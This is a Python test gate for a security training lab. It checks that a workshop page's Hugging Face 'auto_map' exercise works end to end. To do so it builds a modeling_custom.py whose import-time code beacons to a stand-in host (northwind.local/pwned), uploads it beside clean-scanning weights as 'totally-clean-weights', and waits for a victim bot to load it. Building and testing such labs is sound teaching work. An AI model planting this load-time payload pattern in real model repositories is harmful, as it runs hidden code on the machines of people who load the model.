#!/usr/bin/env python3
"""
GATE 5/6 — Workshop 2 exercises 5 and 6 actually fire.

WHY THIS EXISTS
---------------
Exercises 5 and 6 were BROKEN and nobody knew, because no gate reached past
exercise 4. Both wrote:

    "auto_map": {"AutoModel": "modeling_custom.MyModel"}

On the victim's transformers 5.15 that raises "does not recognize this
architecture" while still PARSING the config — so modeling_custom.py is never
imported and the module-level payload never runs. The notebook meanwhile says
"Watch for level 5 on the board", for a beacon that could not arrive.

The fix is that auto_map must ALSO map AutoConfig, and the module must define a
PretrainedConfig subclass. This gate pins both halves so it cannot rot back.

It builds the repo the way a BROWSER would (json + text + hand-made
safetensors), so it covers /w2's path as well as the notebook's.

Usage:  python3 scripts/gate5_6_automap.py [--lab http://localhost]
"""

import argparse
import base64
import json
import pathlib
import re
import struct
import sys
import time
import urllib.request

G, R, Y, D, O = "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[0m"
ROOT = pathlib.Path(__file__).resolve().parent.parent
# The shipped surface is the WEB page now, not notebooks. Same principle:
# read what actually ships, never a known-good copy written in here.
W2 = ROOT / "www" / "w2.html"
ok = fail = 0


def check(cond, label, detail=""):
    global ok, fail
    if cond:
        ok += 1
        print(f"  {G}PASS{O}  {label}")
    else:
        fail += 1
        print(f"  {R}FAIL{O}  {label}")
    if detail:
        print(f"        {D}{detail}{O}")


def post(url, body, timeout=30):
    r = urllib.request.Request(url, data=json.dumps(body).encode(),
                               headers={"Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(r, timeout=timeout))


def safetensors_f32(values):
    """Byte-identical to what the browser builds: 8-byte LE length + JSON + floats."""
    payload = struct.pack("<%df" % len(values), *values)
    head = json.dumps({"weight": {"dtype": "F32", "shape": [len(values)],
                                  "data_offsets": [0, len(payload)]}}).encode()
    return struct.pack("<Q", len(head)) + head + payload


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--lab", default="http://localhost")
    args = ap.parse_args()
    lab = args.lab.rstrip("/")
    team = f"GATE56-{int(time.time()) % 100000}"

    print(f"\n  GATE 5/6 — auto_map really imports the module   lab={lab} team={team}\n")

    # ---- 1. the page ships the fixed config ---------------------------------
    src = W2.read_text()
    check("AutoConfig" in src,
          "w2.html maps AutoConfig, not just AutoModel",
          "without it transformers never imports modeling_custom.py")
    check("PretrainedConfig" in src,
          "w2.html defines a PretrainedConfig subclass")
    # The page builds the object in JS with UNQUOTED keys, so match that shape
    # too -- a regex written only for JSON silently never matches.
    check(not re.search(r'auto_map:\s*\{\s*AutoModel\s*:[^}]*\}', src)
          and not re.search(r'"auto_map":\s*\{\s*"AutoModel"\s*:[^}]*\}', src),
          "no AutoModel-only auto_map left in w2.html",
          "that exact shape is what silently broke the exercise")

    # ---- 3. end to end: upload -> victim loads -> beacon --------------------
    modeling = (
        "import urllib.request\n"
        f'urllib.request.urlopen("http://northwind.local/pwned?team={team}&level=5", timeout=3)\n'
        "\nfrom transformers import PretrainedConfig, PreTrainedModel\n"
        'class MyConfig(PretrainedConfig):\n    model_type = "custom"\n'
        "class MyModel(PreTrainedModel):\n    config_class = MyConfig\n"
        "    def __init__(self, config): super().__init__(config)\n"
    )
    # Lift the auto_map OUT of the page. Writing a known-good one here would
    # prove the mechanism works while saying nothing about what actually ships
    # -- which is how this exercise stayed broken in the first place.
    m = re.search(r'auto_map:\s*\{([^}]*)\}', src)
    if not m:
        check(False, "auto_map lifted from w2.html itself",
              "could not find it -- gate cannot verify what ships")
        return report()
    lifted = m.group(1)
    pairs = dict(re.findall(r'(\w+)\s*:\s*"([^"]+)"', lifted))
    if "AutoConfig" not in pairs or "AutoModel" not in pairs:
        check(False, "auto_map lifted from w2.html itself",
              f"needs both keys, page has: {sorted(pairs)}")
        return report()
    check(True, "auto_map lifted from w2.html itself",
          ", ".join(f"{k}={v}" for k, v in sorted(pairs.items()))[:70])
    config = json.dumps({"model_type": "custom", "architectures": ["MyModel"],
                         "auto_map": pairs})
    b = lambda x: base64.b64encode(x).decode()
    try:
        up = post(f"{lab}/hub/api/upload", {
            "team": team, "repo": "totally-clean-weights",
            "files": {"model.safetensors": b(safetensors_f32([0.1, 0.2, 0.3, 0.4])),
                      "modeling_custom.py": b(modeling.encode()),
                      "config.json": b(config.encode())}})
        check(up.get("ok"), "repo uploads (weights + module + config)",
              ", ".join(up.get("files", [])))
    except Exception as e:
        check(False, "repo uploads", f"{type(e).__name__}: {e}")
        return report()

    # the weights themselves must scan clean — that IS exercise 5's point
    try:
        s = post(f"{lab}/scan", {"team": team, "file": b(safetensors_f32([0.1, 0.2]))})
        check(s.get("verdict") == "clean" and s.get("detected_as") == "safetensors",
              "the weights scan CLEAN — there is genuinely no code in them",
              f"{s.get('verdict')} / {s.get('detected_as')}")
    except Exception as e:
        check(False, "weights scan", f"{type(e).__name__}: {e}")

    print(f"  {D}waiting for the victim bot (polls ~20s)…{O}")
    landed = None
    for _ in range(30):
        try:
            feed = json.load(urllib.request.urlopen(f"{lab}/feed?limit=80", timeout=8))
            landed = next((x for x in feed
                           if x.get("team") == team and str(x.get("level")) == "5"), None)
            if landed:
                break
        except Exception:
            pass
        time.sleep(3)
    check(landed is not None,
          "the victim imported modeling_custom.py and the beacon fired",
          f"level 5 from {landed.get('ua','')}" if landed else
          "NO level-5 beacon — auto_map is not importing the module")

    try:
        urllib.request.urlopen(f"{lab}/teardown?team={team}", timeout=8).read()
    except Exception:
        pass
    return report()


def report() -> int:
    print("\n  " + "-" * 52)
    if fail:
        print(f"  {R}GATE 5/6 FAILED{O}  —  {ok} passed, {fail} failed")
    else:
        print(f"  {G}GATE 5/6 PASSED{O}  —  {ok} checks")
        print("  Exercises 5 and 6 reach the scoreboard.")
    print("  " + "-" * 52 + "\n")
    return 1 if fail else 0


if __name__ == "__main__":
    raise SystemExit(main())
